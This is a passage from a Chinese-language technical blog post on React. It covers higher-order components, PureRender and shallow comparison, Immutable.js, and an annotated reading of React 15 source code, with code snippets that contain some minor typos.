class="function"><span class="params">WrappedComponent</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">AsyncSelectDecorator</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; url, params &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">      fetch(url, &#123; params &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">          data</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        &lt;WrappedComponent</span><br><span class="line">          &#123;...this.props&#125;</span><br><span class="line">          data=&#123;<span class="keyword">this</span>.state.data&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> AsyncSelectDecorator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后，我们用compose将高阶组件层层包裹，将页面和逻辑完美结合在一起<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> FinalSelector = compose(asyncSelectDecorator, searchDecorator, selectedItemDecorator)(Selector)</span><br></pre></td></tr></table></figure></p>
<h1 id="组件性能优化"><a href="#组件性能优化" class="headerlink" title="组件性能优化"></a>组件性能优化</h1><p>从React的渲染过程中，如何防止不必要的渲染是最需要去解决的问题。<br>针对这个问题，React官方提供了一个便捷的方法来解决，那就是PureRender</p>
<h2 id="纯函数"><a href="#纯函数" class="headerlink" title="纯函数"></a>纯函数</h2><p>纯函数由三大原则构成</p>
<p>1.给定相同的输入，它总是返回相同的输出</p>
<p>2.过程没有副作用（我们不能改变外部状态）</p>
<p>3.没有额外的状态依赖</p>
<p>纯函数也非常方便进行方法级别的测试以及重构，可以让程序具有良好的扩展性及适应性。</p>
<h2 id="PureRender"><a href="#PureRender" class="headerlink" title="PureRender"></a>PureRender</h2><p>PureRender中的Pure指的就是组件满足纯函数的条件，即组件的渲染是被相同的props和state渲染进而得到相同的结果。</p>
<p>1.PureRender本质</p>
<p>官方在早期为开发者提供了一个react-addons-pure-render-mixin的插件，其原理为重新实现了shouldComponentUpdate生命周期方法，让当前传入的props和state与之前的作浅比较，如果返回false,那么组件就不会执行render方法。（若做深度比较，也很耗性能）</p>
<p>PuerRender源码中，只对新旧props作了浅比较，以下是shallowEqual的示例代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowEqual</span>(<span class="params">obj, newObj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === newObj) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> objKeys = <span class="built_in">Object</span>.keys(obj);</span><br><span class="line">  <span class="keyword">const</span> newObjKeys = <span class="built_in">Object</span>.keys(newObj);</span><br><span class="line">  <span class="keyword">if</span> (objKeys.length !== newObjKeysl.length) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> objKeys.every(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> newObj[key] === obj[key];</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.优化PureRender</p>
<p>如果说props或state中有以下几种类型的情况，那么无论如何，它都会触发PureRender为true。</p>
<p>3.1直接为props设置对象或数组</p>
<p>引用的地址会改变<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;Account style=&#123;&#123; <span class="attr">color</span>: <span class="string">'black'</span> &#125;&#125; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>避免这个问题<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultStyle = &#123;&#125;;</span><br><span class="line">&lt;Account style=&#123;&#123; <span class="keyword">this</span>.props.style || defaultStyle &#125;&#125; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>3.2设置props方法并通过事件绑定在元素上<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInput</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.handleChange = <span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange(e) &#123;</span><br><span class="line">    <span class="keyword">this</span>.props.update(e.target.value)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span> /&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.3设置子组件</p>
<p>对于设置了子组件的React组件，在调用shouldComponentUpdate时，均返回true。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameItem</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Item&gt;</span><br><span class="line">        &lt;span&gt;Arcthur&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>Item&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;Item </span><br><span class="line">  children=&#123;React.createElement(<span class="string">'span'</span>, &#123;&#125;, <span class="string">'Arcthur'</span>)&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>
<p>怎么避免重复渲染覆盖呢?我们在NameItem设置PureRender，也就是提到父级来判断。</p>
<h2 id="Immutable"><a href="#Immutable" class="headerlink" title="Immutable"></a>Immutable</h2><p> 在传递数据时可以直接使用Immutable Data来进一步提升组件的渲染性能。</p>
<p> JavaScript中的对象一般是可变的，因为使用了引用赋值，新的对象简单地引用了原始对象，改变新的对象将影响到原始对象。</p>
<p> 使用浅拷贝或深拷贝可以避免修改，但这样做又造成了内存和CPU的浪费。</p>
<p> 1.Immutable Data一旦被创建，就不能再更改数据，对Immutable对象进行修改，添加或删除操作，都会返回一个新的Immutable对象。Immutable实现的原理是持久化的数据结构，也就是使用旧数据创建新数据，要保存旧数据同时可用且不变，同时为了避免深拷贝把所有节点复制一遍带来的性能损耗，Immutable使用了结构共享，即如果对象树中一个节点发生变化，只修改这个节点和受它影响的父节点，其他节点则进行共享。</p>
<h2 id="Immutable的优点"><a href="#Immutable的优点" class="headerlink" title="Immutable的优点"></a>Immutable的优点</h2><p>1.降低了可变带来的复杂度。</p>
<p>可变数据耦合了time和value的概念，造成了数据很难被回溯<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">touchAndLog</span> (<span class="params">touchFn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = &#123; <span class="attr">key</span>: <span class="string">'1'</span> &#125;</span><br><span class="line">  touchFn(data);</span><br><span class="line">  <span class="built_in">console</span>.log(data.key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>若data是不可变的，能打印的结果是什么。</p>
<p>2.节省内存</p>
<p>Immutable使用的结构共享尽量复用内存。没有引用的对象会被垃圾回收。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; map &#125; <span class="keyword">from</span> <span class="string">'immutable'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">Map</span>(&#123;</span><br><span class="line">  select: <span class="string">'1'</span>,</span><br><span class="line">  filter: <span class="built_in">Map</span>(&#123; <span class="attr">name</span>: <span class="string">'2'</span> &#125;),</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = a.set(<span class="string">'select'</span>, <span class="string">'people'</span>);</span><br><span class="line"></span><br><span class="line">a === b</span><br><span class="line">a.get(<span class="string">'filter'</span>) === b.get(<span class="string">'filter'</span>)<span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>3.撤销/重做，复制/粘贴，甚至时间旅行这些功能都很容易实现。</p>
<p>因为每次数据都是不一样的，那么只要把这些数据放到一个数组里存储起来，就能自由回退。</p>
<p>4.并发安全</p>
<p>数据天生是不可变的，后端常用的并发锁就不需要了，然而现在并没有用，因为一般JavaScript是单线程运行的。</p>
<p>5.拥抱函数式编程</p>
<p>Immutable本身就是函数式编程中的概念，只要输入一致，输出必然一致。</p>
<h2 id="使用Immutable的缺点"><a href="#使用Immutable的缺点" class="headerlink" title="使用Immutable的缺点"></a>使用Immutable的缺点</h2><p>容易与原生对象混淆是使用Immutale的过程中遇到的最大问题。<br>下面给出了一些办法</p>
<p>1.使用FlowType或TypeScript静态类型检查工具</p>
<p>2.约定变量命名规则，如Immutable类型对象以$$开头</p>
<p>3.使用Immutable.fromJS而不是Immutable.Map或Immutable.List来创建对象，这样可以避免Immutable对象和原生对象间的混用</p>
<h2 id="Immutable-js"><a href="#Immutable-js" class="headerlink" title="Immutable.js"></a>Immutable.js</h2><p>两个Immutable对象可以使用===来比较，这样是直接比较内存地址，其性能最好。但是即使两个对象的值是一样的，也会返回false。</p>
<p>Immutable提供了Immutable.is来作”值比较”，Immutable比较的是两个对象的hasCode或valueOf，由于Immutable内部使用了trie数据结构来存储，只要两个对象的hasCode相等，值就是一样的。这样的算法避免了深度遍历比较，因此性能非常好。</p>
<h2 id="Immutable与cursor"><a href="#Immutable与cursor" class="headerlink" title="Immutable与cursor"></a>Immutable与cursor</h2><p>这里的cursor和数据库中的游标是完全不同的概念。由于Immutable数据一般嵌套非常深，所以为了便于访问深层数据，cursor提供了可以直接访问这个深层数据的引用：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> data = Immutable.fromJS(&#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="number">1</span> &#125; &#125; &#125;);</span><br><span class="line"><span class="keyword">let</span> cursor = Cursor.from(data, [<span class="string">'a'</span>, <span class="string">'b'</span>], newData =&gt; &#123;</span><br><span class="line">  <span class="comment">// 当cursor或其子cursor执行更新时调用</span></span><br><span class="line">  <span class="built_in">console</span>.log(newData)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line">cursor.get(<span class="string">'c'</span>);</span><br><span class="line">cursor = cursor.update(<span class="string">'c'</span>, x =&gt; x + <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">cursor.get(<span class="string">'c'</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="Immutable与PureRender"><a href="#Immutable与PureRender" class="headerlink" title="Immutable与PureRender"></a>Immutable与PureRender</h2><p>React做性能优化时最常用的就是shouldComponentUpdate，使用深拷贝和深比较是非常昂贵的选择。而使使用Immutable.js，===和is是高效地判断数据是否变化的方法。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; is &#125; <span class="keyword">from</span> <span class="string">'immutable'</span></span><br><span class="line"></span><br><span class="line">shouldComponentUpdate(nextProps, nextState) &#123;</span><br><span class="line">  <span class="keyword">const</span> thisProps = <span class="keyword">this</span>.props || &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> thisState = <span class="keyword">this</span>.state || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">Object</span>.keys(thisProps).length !== <span class="built_in">Object</span>.keys(nextProps).length || <span class="built_in">Object</span>.keys(thisState).length !== <span class="built_in">Object</span>.keys(nextState).length)  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> nextProps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nextProps.hasOwnProperty(key) &amp;&amp; !is(thisProps[key], nextProps[key])) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> nextState) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nextState.hasOwnProperty(key) &amp;&amp; !is(thisState[key], nextState[key])) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Immutable与setState"><a href="#Immutable与setState" class="headerlink" title="Immutable与setState"></a>Immutable与setState</h2><p>React建议把this.state当作不可变的，因此修改前需要做一个深拷贝<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">'lodash'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.state = &#123;</span><br><span class="line">    data: &#123; <span class="attr">time</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleAdd() &#123;</span><br><span class="line">    <span class="keyword">let</span> data = _.cloneDeep(<span class="keyword">this</span>.state.data);</span><br><span class="line">    data.time = data.time + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; data &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用Immutable后，操作变得很简单<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="built_in">Map</span> &#125; <span class="keyword">from</span> <span class="string">'immutable'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.state = &#123;</span><br><span class="line">    data: <span class="built_in">Map</span>(&#123; <span class="attr">time</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleAdd() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function">(<span class="params">&#123; data &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      data: data.update(<span class="string">'times'</span>, v =&gt; v + <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Immutable可以给应用带来极大的性能提升。</p>
<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>如果每一个组件是一个数组或迭代器的话，那么必须有一个唯一的key prop。它是用来标识当前项的唯一性的。如果使用index，它相当于一个随机键，无论有没有相同的项，更新都会渲染。如果key相同，react会抛警告，且只会渲染第一个key。</p>
<p>若有两个子组件需要渲染，可以用插件createFragment包裹来解决。</p>
<h2 id="react-addons-perf"><a href="#react-addons-perf" class="headerlink" title="react-addons-perf"></a>react-addons-perf</h2><p>react-addons-perf通过Perf.start和Perf.stop两个API设置开始和结束的状态来作分析，它会把各组件渲染的各阶段的时间统计出来，然后打印出一张表格。</p>
<h1 id="解读-React-源码"><a href="#解读-React-源码" class="headerlink" title="解读 React 源码"></a>解读 React 源码</h1><p>注：源码以React15.0</p>
<p>reconciler（协调器），是最核心的部分。包含 React 中自定义组件的实现（ReactCompositeComponent）、组件生命周期机制、setState 机制（ReactUpdates、ReactUpdateQueue）、DOM diff 算法（ReactMultiChild）等重要的特性方法。</p>
<h2 id="Virtual-DOM-1"><a href="#Virtual-DOM-1" class="headerlink" title="Virtual DOM"></a>Virtual DOM</h2><p>构建一套简易的 Virtual DOM 并不复杂，它只需要具备一个 DOM 标签所需要的基本元素即可：</p>
<ol>
<li>标签名</li>
<li>节点属性，包含样式、属性、事件等</li>
<li>子节点</li>
<li>标识 id</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  tagName: <span class="string">'div'</span>,</span><br><span class="line">  properties: &#123;</span><br><span class="line">    style: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  children: [],</span><br><span class="line">  key: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Virtual DOM 当然远不止于此，却也离不开这些基础元素。下面让我们一探究竟</p>
<p>Virtual DOM 中的节点称为 ReactNode,它分为 3 种类型 ReactElement、ReactFragment 和 ReactText。其中 ReactElement 又分为 ReactComponentElement 和 ReactDOMElement。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type ReactNode = ReactElement | ReactFragment | ReactText;</span><br><span class="line"></span><br><span class="line">type ReactElement = ReactComponentElement | ReactDOMElement;</span><br><span class="line"></span><br><span class="line">type ReactDOMElement = &#123;</span><br><span class="line">  type: string,</span><br><span class="line">  props: &#123;</span><br><span class="line">    children: ReactNodeList,</span><br><span class="line">    className: string,</span><br><span class="line">    etc.</span><br><span class="line">  &#125;,</span><br><span class="line">  key: string | boolean | number | <span class="literal">null</span>,</span><br><span class="line">  ref: string | <span class="literal">null</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">type ReactComponentElement&lt;TProps&gt; = &#123;</span><br><span class="line">  type: ReactClass&lt;TProps&gt;,</span><br><span class="line">  props: TProps,</span><br><span class="line">  key: string | boolean | number | <span class="literal">null</span>,</span><br><span class="line">  ref: string | <span class="literal">null</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">type ReactFragment = <span class="built_in">Array</span>&lt;ReactNode | ReactEmpty&gt;;</span><br><span class="line"></span><br><span class="line">type ReactNodeList = ReactNode | ReactEmpty;</span><br><span class="line"></span><br><span class="line">type ReactText = string | number;</span><br><span class="line"></span><br><span class="line">type ReactEmpty = <span class="literal">null</span> | <span class="literal">undefined</span> | boolean;</span><br></pre></td></tr></table></figure>
<p>Virtual DOM 是如何根据这些节点类型来创建元素的呢？</p>
<h2 id="创建-React-元素"><a href="#创建-React-元素" class="headerlink" title="创建 React 元素"></a>创建 React 元素</h2><p>我们知道通过 JSX 创建的虚拟元素最终会被编译成调用 React 的 createElement 方法。那么 createElement 方法到底做了什么呢,其实 createElement 只是做了简单的参数修正，返回一个 ReactElement 实例对象，也就是虚拟元素实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ReactElement.createElement = <span class="function"><span class="keyword">function</span>(<span class="params">type, config, children</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化参数</span></span><br><span class="line">  <span class="keyword">var</span> propName;</span><br><span class="line">  <span class="keyword">var</span> props = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> key = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> ref = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> source = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果存在config，则提取里面的内容</span></span><br><span class="line">  <span class="keyword">if</span> (config != <span class="literal">null</span>) &#123;</span><br><span class="line">    ref = config.ref === <span class="literal">undefined</span> ? <span class="literal">null</span> : config.ref;</span><br><span class="line">    key = config.key === <span class="literal">undefined</span> ? <span class="literal">null</span> : <span class="string">''</span> + config.key;</span><br><span class="line">    self = config.__self === <span class="literal">undefined</span> ? <span class="literal">null</span> : config.__self;</span><br><span class="line">    source = config.__source === <span class="literal">undefined</span> ? <span class="literal">null</span> : config.__source;</span><br><span class="line">    <span class="comment">// 复制config里的内容到props（如id和className等）</span></span><br><span class="line">    <span class="keyword">for</span> (propName <span class="keyword">in</span> config) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.hasOwnProperty(propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName)) &#123;</span><br><span class="line">        props[propName] = config[propName];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理children，全部挂载到props的children属性上。如果只有一个参数，直接赋值给children，否则做合并处理。</span></span><br><span class="line">  <span class="keyword">var</span> childrenLength = <span class="built_in">arguments</span>.length - <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (childrenLength === <span class="number">1</span>) &#123;</span><br><span class="line">    props.children = children;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childrenLength &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> childArray = <span class="built_in">Array</span>(childrenLength);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; childrenLength; i ++) &#123;</span><br><span class="line">      childArray[i] = <span class="built_in">arguments</span>[i + <span class="number">2</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    props.children = childArray;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果某个prop为空且存在默认的prop，则将默认prop赋给当前的prop</span></span><br><span class="line">  <span class="keyword">if</span> (type &amp;&amp; type.defaultProps) &#123;</span><br><span class="line">    <span class="keyword">var</span> defaultProps = type.defaultProps;</span><br><span class="line">    <span class="keyword">for</span> (propName <span class="keyword">in</span> defaultProps) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> props[propName] === <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        props[propName] = defaultProps[propName]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个ReactElement实例对象</span></span><br><span class="line">  <span class="keyword">return</span> ReactElement(type, key, ref, self, source, ReactCurrentOwner.current, props)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Virtual DOM 通过 createElement 创建虚拟元素，那又是如何创建组件的呢？</p>
<h2 id="初始化组件入口"><a href="#初始化组件入口" class="headerlink" title="初始化组件入口"></a>初始化组件入口</h2><p>当使用 React 创建组件时，首先会调用 instantiateReactComponent,这是初始化组件的入口函数，它通过判断 node 类型来区分不同组件的入口。</p>
<ol>
<li><p>当 node 为空时，说明 node 不存在，则初始化空组件 ReactEmptyComponent.create(instantiateReactComponent).</p>
</li>
<li><p>当 node 类型为对象，需进一步判断，如果 element 类型为字符串时，则初始化 DOM 标签组件 ReactNativeComponent.createInternalComponent(element),否则初始化自定义组件<br>ReactCompositeComponentWrapper()</p>
</li>
<li><p>当 node 类型为字符串或数字时，则初始化文本组件 ReactNativeComponent.createInstanceForText(node)</p>
</li>
<li><p>其他情况不处理</p>
</li>
</ol>
<p>instantiateReactComponent方法的源码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化组件入口</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">instantiateReactComponent</span>(<span class="params">node, parentCompositeType</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> instance;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 空组件（ReactEmptyComponent）</span></span><br><span class="line">  <span class="keyword">if</span> (node === <span class="literal">null</span> || node === <span class="literal">false</span>) &#123;</span><br><span class="line">    instance = ReactEmptyComponent.create(instantiateReactComponent);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> node === <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> element = node;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> element.type === <span class="string">'string'</span>) &#123;</span><br><span class="line">      <span class="comment">// DOM标签（ReactDOMComponent）</span></span><br><span class="line">      instance = RectNativeComponent.createInternalComponent(element)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isInternalComponentType(element.type)) &#123;</span><br><span class="line">      <span class="comment">// 不是字符串表示的自定义组件暂无法使用，此处将不做组件的初始化操作</span></span><br><span class="line">      instance = <span class="keyword">new</span> element.type(element);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 自定义组件（ReactCompositeComponent）</span></span><br><span class="line">      instance = <span class="keyword">new</span> ReactCompositeComponentWrapper();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> node === <span class="string">'string'</span> || <span class="keyword">typeof</span> node === <span class="string">'number'</span>) &#123;</span><br><span class="line">    <span class="comment">// 字符串或数字（ReactTextComponent）</span></span><br><span class="line">    instance = ReactNativeComponent.createInstanceForText(node)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不做处理</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置实例</span></span><br><span class="line">  instance.construct(node);</span><br><span class="line">  <span class="comment">// 初始化参数</span></span><br><span class="line">  instance._mountIndex = <span class="number">0</span>;</span><br><span class="line">  instance._mountImage = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="文本组件"><a href="#文本组件" class="headerlink" title="文本组件"></a>文本组件</h2><p>node 类型为文本节点是不算 Virtual DOM 元素的，但 React 为了保持渲染的一致性，将其封装为文本组件ReactDOMTextComponent。</p>
<p>在执行 mountComponent 方法时，ReactDOMTextComponent 通过 transaction.useCreateElement 判断该文本是否是通过 createElement 方法创建的节点，如果是，则为该节点创建相应的标签和标识 domID，这样每个文本节点也能与其他 React 节点一样拥有自己的唯一标识，同时也拥有了VirtualDOM diff的权利。如果不是，则不再为其创建<code>&lt;span&gt;</code>和 domID 标识，直接返回文本。</p>
<p>不再为裸露的文本内容包裹<code>&lt;span&gt;</code>标签,是React15.0版本的更新点之一。此前，React为裸露的文本内容包裹上<code>&lt;span&gt;</code>标签，其实并没有任何作用，反而增加了不必要的标签。</p>
<p>在执行 receiveComponent 方法时，可以通过 DOMChildrenOperations.replaceDelimitedText(componentNodes[0], componentNodes[1], nextStringText)来更新文本内容。</p>
<p>ReactDOMTextComponent的源码：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建文本组件，这是ReactText，并不是ReactElementd</span></span><br><span class="line"><span class="keyword">var</span> ReactDOMTextComponent = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 保存当前的字符串</span></span><br><span class="line">  <span class="keyword">this</span>._currentElement = text;</span><br><span class="line">  <span class="keyword">this</span>._stringText = <span class="string">''</span> + text;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ReactDOMComponentTree 需要使用的参数</span></span><br><span class="line">  <span class="keyword">this</span>._nativeNode = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>._nativeParent = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 属性</span></span><br><span class="line">  <span class="keyword">this</span>._domID = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>._mountIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>._closingComment = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>._commentNodes = <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(ReactDOMTextComponent.prototype, &#123;</span><br><span class="line">  mountComponent: <span class="function"><span class="keyword">function</span>(<span class="params">transaction nativeParent, nativeContainerInfo, context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> domID = nativeContainerInfo._idCounter++;</span><br><span class="line">    <span class="keyword">var</span> openingValue = <span class="string">' react-text: '</span> + domID + <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> closingValue = <span class="string">' /react-text '</span>;</span><br><span class="line">    <span class="keyword">this</span>._domID = domID;</span><br><span class="line">    <span class="keyword">this</span>._nativeParent = nativeParent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果使用createElement创建文本标签，则该文本会带上标签和domID</span></span><br><span class="line">    <span class="keyword">if</span> (transaction.useCreateElement) &#123;</span><br><span class="line">      <span class="keyword">var</span> ownerDocument = nativeContainerInfo._ownerDocument;</span><br><span class="line">      <span class="keyword">var</span> openingComment = ownerDocument.createCommet(openingValue);</span><br><span class="line">      <span class="keyword">var</span> closingComment = ownerDocument.createComment(closingValue);</span><br><span class="line">      <span class="keyword">var</span> lazyTree = DOMLazyTree(ownerDocument.createDocumentFragment());</span><br><span class="line">      <span class="comment">// 开始标签</span></span><br><span class="line">      DOMLazyTree.queueChild(lazyTree, 